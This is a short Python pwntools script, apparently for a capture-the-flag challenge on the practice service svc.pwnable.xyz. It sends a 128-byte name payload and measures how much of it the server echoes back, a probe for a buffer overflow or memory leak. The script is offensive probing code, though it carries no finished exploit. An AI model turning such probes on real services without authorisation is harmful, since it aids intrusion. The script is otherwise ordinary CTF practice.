#!/usr/bin/env python3

from pwn import *

conn = remote('svc.pwnable.xyz', 30004)

conn.recvuntil(b'[y/N]: ')
conn.sendline(b'y')

conn.recvuntil(b'Name: ')

# Enviar exactamente 128 bytes
payload = b'B' * 128

conn.sendline(payload)

data = conn.recvall(timeout=3)
print(f"Respuesta completa:\n{data}")
print(f"\nLongitud total: {len(data)}")

# Extraer solo lo copiado
if b'Welcome ' in data:
    copied = data.split(b'Welcome ')[1].split(b'\n')[0]
    print(f"Copiado: {copied}")
    print(f"Longitud copiada: {len(copied)}")

conn.close()